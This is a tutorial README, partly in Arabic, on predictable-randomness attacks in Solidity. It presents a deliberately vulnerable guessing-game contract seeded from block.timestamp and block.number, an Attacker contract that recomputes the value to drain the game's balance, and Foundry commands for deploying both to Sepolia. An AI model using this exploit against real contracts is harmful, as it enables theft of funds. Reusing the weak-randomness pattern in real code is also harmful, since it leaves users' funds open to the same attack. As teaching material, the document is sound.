# Randomness-attack- 
## 1- What is Randomness?
run same code get diffirent result

## 2- what is Determinisitic System?
   * Same Input == Same Outbut
   * every node must agree on the same state
    
  ```solidity
 function test(uint256 a) public pure returns(uint256){
      return a*2;
   }          // same input same output
   
```
 ![Image](https://github.com/user-attachments/assets/266e1bd8-ba9d-4746-a793-4fb934ed254b)


## 3- why we need randomness in web3
   * Games NFT (Non Fungible Tokens  ) [ERC721](https://docs.openzeppelin.com/contracts/3.x/erc721)  Choose Winner
   * 🏛️ DAO = Decentralized Autonomous Organization choose Member to Voting
   * AirDrops
   * Validatores , committes , nodes  proof of stake (ethereum2, polkadot ,Algorand)
   * Defi Decentralized Finance
     
# Example 01
Smart contract Game to guess number and win the game

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Game {
    constructor() payable{

    }

    function play(uint256 guess) external{
        uint256 randomNumber = block.timestamp + block.number; 

        if(randomNumber == guess){
           payable(msg.sender). transfer(address(this).balance);        
        }
    }

}
```
Command to compile
```
forge compile
```
Command to deploy on sepolia
```
 forge create <contract path> --rpc-url <sepolia rpc>  --private-key <your private key> --value <charge contract with ethereum> --broadcast
```
# 🔌 Who Provides RPC Endpoints?

There are several popular providers that offer reliable RPC endpoints for interacting with blockchain networks:

- [Infura](https://infura.io)
- [Alchemy](https://www.alchemy.com)
- [Ankr](https://www.ankr.com)
- [QuickNode](https://www.quicknode.com)

Alternatively, you can run your own Ethereum node (e.g., using Geth or Nethermind) and host your own RPC endpoint for full control and privacy.


Command to check Balance
```
cast balance 0xYourContractAddress --rpc-url <your rpc>
```
convert from wei to ether

```
cast from-wei 1000000000000000000

```

# Scritp to deploy Game Contract 
```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/Game.sol";

contract DeployGame is Script {
    function run() external{

        vm.startBroadcast() ;

       Game game = new Game{value: 0.01 ether}();
 


        vm.stopBroadcast ();

    }
}
```
> ❗ **تنبيه مهم (في حالتك):**  
> طالما عقد `Game` عنده constructor عليه `payable`، يعني محتاج تديله فلوس وقت النشر، يبقى لازم تكتب السطر كده:
>
> ```solidity
> Game game = new Game{value: 0.01 ether}();
> ```
>
> عشان تبعتله `0.01 ETH` وقت النشر.

> 💡 **ملاحظة إضافية:**  
> لو انت بتدفع `value` وقت النشر (عشان العقد بياخد فلوس في الـ `constructor`)، لازم تكتبها جوه `new Game{value: ...}` جوه السكريبت:
>
> ```solidity
> Game game = new Game{value: 0.01 ether}();
> ```
>
> مش هينفع تعتمد بس على `--value` من CLI، لازم الاتنين مع بعض.
ركز إن --broadcast لازم يكون قبل --value.




## Smart contract to attack the Game

```solidity

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGame{
        function play(uint256 guess) external;
    }

contract Attacker{
    IGame public game;  //store Games Address

    constructor(address GameContract) payable{
        game = IGame(GameContract);

    }

    function attack() external payable{
        uint predictNumber = block.timestamp + block.number;
        game.play(predictNumber);
    }
    receive() external payable {}

}
```
Command to compile
```
forge compile <contract path>
```
Command to deploy on sepolia
```
 forge create <contract path> --rpc-url <sepolia rpc>  --private-key <your private key>  --broadcast
```
Command to call function play

```
 cast send <contract address>  --rpc-url <your rpc> --private-key <your private key >   '<function name>'
```

Command to check Balance
```
cast balance 0xYourContractAddress --rpc-url <your rpc>
```
## script to deploy Attacker contract 

```solidity

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/Attacker.sol";
contract DeployAttacker is Script{

    
    function run() external{

        vm.startBroadcast();

        Attacker attacker = new Attacker{value : 0}(0xC1685e8D090D914112afaadD29Ec5A7eB4185957);


        vm.stopBroadcast();
    }
}
```




   

